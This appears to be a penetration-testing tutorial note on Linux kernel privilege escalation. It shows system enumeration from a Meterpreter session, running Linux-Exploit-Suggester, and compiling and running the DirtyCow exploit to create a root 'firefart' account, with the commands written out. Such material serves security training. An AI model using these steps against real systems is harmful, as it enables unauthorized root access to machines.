# A - Linux Kernel Exploits

### **Linux Kernel Exploitation**

* Kernel exploits on Linux will typically target vulnerabilities in the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.
* This process will differ based on the Kernel version and distribution being targeted and the kernel exploit being used.
* Privilege escalation on Linux systems will typically follow the following methodology:
  * Identifying kernel vulnerabilities.
  * Downloading, compiling and transferring kernel exploits onto the target system.

### **Tool & Environment**

* Linux-Exploit-Suggester - This tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It assesses (using heuristics methods) the exposure of the given kernel on every publicly know Linux kernel exploit.
  * GitHub: [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)



## **Practical Demonstration**

After gaining initial foothold on the target, perform some system enumeration.

```bash
sysinfo #Returns system info
getuid #Return user you're currently logged in with
getprivs #Returns privilges available to current user
shell # switch to a shells session on target system.

/bin/bash -i #Elevate to a bash shell
groups www-data # list groups the user belongs to.
bash > cat /etc/passw #Returns all users available on the system.


# Elevating privileges.
# download the Linux-Exploit-Suggester tool.
# Upload LES tool into /tmp folder on target system.
upload <localPathToFile > les.sh

# open a shell session again
shell
/bin/bash -i
chmod +x les.sh # give it execution permission.
./les.sh # Execute the LES tool.
# we get many vuln results such as: dirtycow, dirtycow2, perf_swevent etc..
# when the OS version is specified in color "Yellow" means its vuln to the exploit.

#Check result of LES and choose a kernel exploit to use, then read it's documentation.
#Follow the documentation instructions (it's different from an exploit to another but usually, download -> compile -> upload -> execute).
#You may need to compile the exploit code directly onto the target machine.


# in our case we will be using the "dirtycow" exploit.
# step 1
# download the C code from exploitdb.com.

# step 2
# Compilation process.
# download the "gcc" compiler with "sudo apt-get install gcc".
gcc -pthread dirty.c -o dirty -lcrypt # cmd to compile the file.

# step 3
# upload the compiled file to the target, from the meterpreter session.
upload ~/Downloads/dirty
shell  # spawn a shell session.
/bin/bash -i
chmod +x dirty
./dirty password123
# and the exploit failed, so we have to compile it on the target PC.
# repeat same steps on the target PC.

# we then get a "firefart" user created with root privilege, we can switch to it.
# we can use ssh to the "firefart" user.
```



